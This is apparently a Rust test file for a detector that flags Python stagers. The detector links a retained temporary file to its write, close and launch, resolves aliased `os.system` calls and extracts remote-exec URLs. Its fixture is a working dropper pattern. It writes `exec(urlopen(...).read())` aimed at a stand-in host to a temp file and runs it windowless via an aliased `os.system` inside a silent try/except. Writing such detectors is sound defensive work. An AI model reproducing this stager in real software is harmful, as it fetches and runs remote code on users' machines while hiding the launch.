use serde_json::{Value, json};

fn values(source: &str) -> Value {
    let parsed = crate::OpenOptions::new()
        .path(std::path::Path::new("stage.py"))
        .open(source.as_bytes());
    parsed.values().as_json().clone()
}

fn files(source: &str) -> Vec<Value> {
    values(source)
        .pointer("/source/python/temporary_files")
        .and_then(Value::as_array)
        .cloned()
        .unwrap_or_default()
}

fn calls(source: &str) -> Vec<Value> {
    values(source)
        .pointer("/source/python/module_alias_calls")
        .and_then(Value::as_array)
        .cloned()
        .unwrap_or_default()
}

/// The events recorded for the temporary file bound to `variable`.
fn events(source: &str, variable: &str) -> Vec<Value> {
    files(source)
        .into_iter()
        .find(|f| f["variable"] == variable)
        .and_then(|f| f["events"].as_array().cloned())
        .unwrap_or_default()
}

fn event<'a>(events: &'a [Value], kind: &str) -> Option<&'a Value> {
    events.iter().find(|e| e["event"] == kind)
}

fn stager() -> &'static str {
    r#"from tempfile import NamedTemporaryFile as _tmp
from sys import executable as _py
from os import system as _run
handle = _tmp(delete=False)
handle.write(b"""from urllib.request import urlopen as _get;exec(_get('https://example.test/stage').read())""")
handle.close()
try: _run(f"start {_py.replace('.exe', 'w.exe')} {handle.name}")
except: pass
"#
}

#[test]
fn relates_a_retained_file_to_its_write_close_and_launch() {
    let found = files(stager());
    assert_eq!(found.len(), 1, "{found:?}");
    let file = &found[0];
    assert_eq!(file["variable"], "handle");
    assert_eq!(file["delete"], false);
    assert_eq!(file["trigger"], "module");
    assert_eq!(file["ended"]["reason"], "try");
    let recorded = file["events"].as_array().unwrap();
    let kinds: Vec<&str> = recorded
        .iter()
        .filter_map(|e| e["event"].as_str())
        .collect();
    assert_eq!(kinds, ["write", "close", "launch"]);
    assert_eq!(recorded[0]["bytes"], true);
    assert_eq!(
        recorded[0]["remote_exec_urls"],
        json!(["https://example.test/stage"])
    );
    let launch = &recorded[2];
    assert_eq!(launch["launcher"], "os.system");
    assert_eq!(launch["private_alias"], true);
    assert_eq!(launch["interpreter"], "sys.executable");
    assert_eq!(launch["windowless_interpreter"], true);
    assert_eq!(launch["command_prefix"], "start ");
    assert_eq!(launch["trigger"], "module_try");

    let renamed = stager()
        .replace("_run", "_other")
        .replace("handle", "another");
    let renamed = events(&renamed, "another");
    assert!(event(&renamed, "launch").is_some(), "{renamed:?}");
}

/// Each change breaks exactly the relation it touches.
#[test]
fn broken_relationships_are_visible_in_the_relation_they_break() {
    let launched = |source: &str| event(&events(source, "handle"), "launch").cloned();
    assert!(launched(&stager().replace("{handle.name}", "{other.name}")).is_none());
    assert!(
        launched(&stager().replace("from os import system", "from other import system")).is_none()
    );
    assert!(launched(&stager().replace("try: _run", "_run = print\ntry: _run")).is_none());
    assert_eq!(
        launched(&stager().replace("replace('.exe', 'w.exe')", "replace(b'.exe', b'w.exe')"))
            .map(|l| l["windowless_interpreter"].clone()),
        Some(json!(false))
    );
    assert_eq!(
        launched(&stager().replace("from sys import executable", "from other import executable"))
            .map(|l| l["interpreter"].clone()),
        Some(json!("other.executable"))
    );

    let file = |source: &str| {
        files(source)
            .into_iter()
            .find(|f| f["variable"] == "handle")
    };
    assert_eq!(
        file(&stager().replace("delete=False", "delete=True")).map(|f| f["delete"].clone()),
        Some(json!(true))
    );
    assert_eq!(
        file(&stager().replace("delete=False", "delete=False, mode='w+'"))
            .map(|f| f["mode"].clone()),
        Some(json!("w+"))
    );
    assert_eq!(
        file(&stager().replace("handle.close()", "handle = other\nhandle.close()"))
            .map(|f| f["ended"]["reason"].clone()),
        Some(json!("rebound"))
    );
    for opaque in [
        stager().replace("handle.close()", "print('test')"),
        stager().replace("handle.write", "other.write"),
        stager().replace(
            "handle.close()",
            "print(handle.write(b'print(1)'))\nhandle.close()",
        ),
    ] {
        let found = file(&opaque).unwrap();
        assert_eq!(found["ended"]["reason"], "opaque-call", "{opaque}");
        assert!(
            event(found["events"].as_array().unwrap(), "launch").is_none(),
            "{opaque}"
        );
    }

    let write = |source: &str| event(&events(source, "handle"), "write").cloned();
    assert_eq!(
        write(&stager().replace("write(b", "write("))
            .map(|w| (w["bytes"].clone(), w["remote_exec_urls"].clone())),
        Some((json!(false), json!([])))
    );
    assert_eq!(
        write(&stager().replace("exec(_get", "print(_get")).map(|w| w["remote_exec_urls"].clone()),
        Some(json!([]))
    );
    for twice in [
        stager().replace(
            "handle.close()",
            "handle.write(b'print(1)')\nhandle.close()",
        ),
        stager().replace(
            "handle.close()",
            "written = handle.write(b'print(1)')\nhandle.close()",
        ),
    ] {
        let writes = events(&twice, "handle")
            .iter()
            .filter(|e| e["event"] == "write")
            .count();
        assert_eq!(writes, 2, "{twice}");
    }
}

#[test]
fn binds_aliases_to_direct_module_and_try_calls() {
    for source in [
        "from os import system as _run\n_run('echo test')",
        "import os as _o\n_o.system('echo test')",
    ] {
        let actual = calls(source);
        assert_eq!(actual.len(), 1);
        assert_eq!(actual[0]["resolved_callee"], "os.system");
        assert_eq!(actual[0]["trigger"], "module");
        assert_eq!(actual[0]["private_alias"], true);
    }
    let actual = calls("from os import system as _run\ntry: _run('echo test')\nexcept: pass");
    assert_eq!(actual.len(), 1);
    assert_eq!(actual[0]["trigger"], "module_try");
    let public = calls("from os import system\nsystem('test')");
    assert_eq!(public.len(), 1);
    assert_eq!(public[0]["resolved_callee"], "os.system");
    assert_eq!(public[0]["private_alias"], false);
}

#[test]
fn does_not_join_unrelated_calls_shadowed_names_or_inert_text() {
    for source in [
        "from os import system as _run\nprint('test')",
        "from os import system as _run\n_run = print\n_run('test')",
        "from os import system as _run\ndef _run(x): pass\n_run('test')",
        "from os import system as _run\ndef f():\n _run('test')",
        "from os import system as _run\nif __name__ == '__main__':\n _run('test')",
        "from os import system as _run\nif flag: _run = print\n_run('test')",
        "source = \"from os import system as _run; _run('test')\"",
    ] {
        assert!(calls(source).is_empty(), "{source}");
    }
}

/// The literal written to a file is parsed with the shared bounded parser,
/// never a parser of its own: a literal its guards refuse yields no URLs.
#[test]
fn written_source_is_parsed_with_the_bounded_parser() {
    let oversized = format!(
        "from urllib.request import urlopen as g\nexec(g('https://example.test/a').read())\n#{}",
        "x".repeat(super::MAX_WRITTEN_SOURCE_BYTES)
    );
    assert!(super::remote_exec_urls(&oversized).is_empty());
    assert_eq!(
        super::remote_exec_urls(
            "from urllib.request import urlopen as g\nexec(g('https://example.test/a').read())\n"
        ),
        ["https://example.test/a"]
    );
}
